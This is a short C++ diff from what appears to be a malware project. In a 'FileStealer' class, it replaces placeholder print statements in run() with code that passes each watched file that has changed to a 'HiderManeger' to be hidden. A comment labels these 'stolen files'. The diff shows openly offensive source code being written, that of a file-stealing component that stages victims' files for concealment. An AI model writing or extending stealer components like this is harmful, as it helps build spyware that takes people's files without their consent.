@@ -32,14 +32,13 @@ int FileStealer::halt() {
     return 0;
 }
 
+// sends stolen files to hide in hider
 int FileStealer::run(const ContParams contParams) {
 
     for (auto const & file : files) {
         if (hasFileChanged(file.first)) {
-            // SEND FILE
-            // Hider.Save
-            std::cout << "FileStealer::Run: PlaceHolder for sending file" << std::endl;
-            std::cout << "FileStealer::Run: PlaceHolder for saving file in hider" << std::endl;
+            HiderManeger& h = HiderManeger::getInstance();
+            h.hideFile(file.first, std::to_string(file.second));
         }
     }
 
